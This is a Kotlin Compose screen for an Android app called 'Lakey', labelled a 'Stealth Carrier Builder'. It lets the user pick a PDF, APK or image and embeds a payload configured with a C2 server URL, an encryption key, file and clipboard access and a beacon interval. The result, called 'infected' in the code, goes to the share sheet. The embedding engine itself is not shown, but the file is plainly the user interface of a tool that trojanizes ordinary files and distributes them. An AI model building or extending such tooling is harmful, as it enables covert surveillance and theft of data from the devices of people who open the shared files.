package com.anonymousbeta.lakey.ui.screens

import android.net.Uri
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.anonymousbeta.lakey.payload.PayloadConfig
import com.anonymousbeta.lakey.share.ShareHelper
import com.anonymousbeta.lakey.stego.CarrierType
import com.anonymousbeta.lakey.stego.StegoEngine
import com.anonymousbeta.lakey.ui.theme.*
import com.anonymousbeta.lakey.utils.Prefs
import kotlinx.coroutines.launch

@Composable
fun BuilderScreen() {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val stegoEngine = remember { StegoEngine(context) }
    val shareHelper = remember { ShareHelper(context) }
    val prefs = remember { Prefs(context) }

    var selectedUri by remember { mutableStateOf<Uri?>(null) }
    var carrierType by remember { mutableStateOf<CarrierType?>(null) }
    var status by remember { mutableStateOf("Drop a PDF, APK or Image") }
    var isWorking by remember { mutableStateOf(false) }

    val picker = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri ->
        if (uri != null) {
            selectedUri = uri
            carrierType = stegoEngine.detectType(uri)
            status = when (carrierType) {
                CarrierType.IMAGE -> "Image selected – ready"
                CarrierType.PDF   -> "PDF selected – ready"
                CarrierType.APK   -> "APK selected – ready"
                null -> "Unsupported file type"
            }
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(BlackDeep)
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(
            text = "LAKEY",
            color = Gold,
            fontSize = 32.sp,
            fontWeight = FontWeight.Bold
        )
        Text(
            text = "Stealth Carrier Builder",
            color = TextSecondary,
            fontSize = 14.sp
        )

        Spacer(modifier = Modifier.height(40.dp))

        Box(
            modifier = Modifier
                .fillMaxWidth()
                .height(180.dp)
                .clip(RoundedCornerShape(16.dp))
                .background(BlackCard)
                .border(1.dp, Gold.copy(alpha = 0.4f), RoundedCornerShape(16.dp))
                .clickable { picker.launch("*/*") },
            contentAlignment = Alignment.Center
        ) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Text(
                    text = status,
                    color = TextPrimary,
                    fontSize = 16.sp
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = "Tap to select carrier",
                    color = TextSecondary,
                    fontSize = 13.sp
                )
            }
        }

        Spacer(modifier = Modifier.height(32.dp))

        Button(
            onClick = {
                val uri = selectedUri
                val type = carrierType
                if (uri == null || type == null) {
                    status = "Select a valid carrier first"
                    return@Button
                }
                isWorking = true
                status = "Embedding payload..."
                scope.launch {
                    try {
                        val config = PayloadConfig(
                            c2Url = prefs.c2Url,
                            encryptionKey = prefs.encryptionKey,
                            enableFileAccess = prefs.enableFileAccess,
                            enableClipboard = prefs.enableClipboard,
                            beaconIntervalSeconds = prefs.beaconInterval
                        )
                        val infected = stegoEngine.embed(uri, type, config)
                        status = "Done – sharing..."
                        val mime = when (type) {
                            CarrierType.IMAGE -> "image/png"
                            CarrierType.PDF   -> "application/pdf"
                            CarrierType.APK   -> "application/vnd.android.package-archive"
                        }
                        shareHelper.shareFile(infected, mime)
                        status = "Carrier ready and shared"
                    } catch (e: Exception) {
                        status = "Error: ${e.message}"
                    } finally {
                        isWorking = false
                    }
                }
            },
            enabled = !isWorking && selectedUri != null && carrierType != null,
            colors = ButtonDefaults.buttonColors(
                containerColor = Gold,
                contentColor = BlackDeep,
                disabledContainerColor = Gold.copy(alpha = 0.3f)
            ),
            modifier = Modifier
                .fillMaxWidth()
                .height(52.dp),
            shape = RoundedCornerShape(12.dp)
        ) {
            Text(
                text = if (isWorking) "Working..." else "Embed + Share",
                fontWeight = FontWeight.SemiBold
            )
        }
    }
}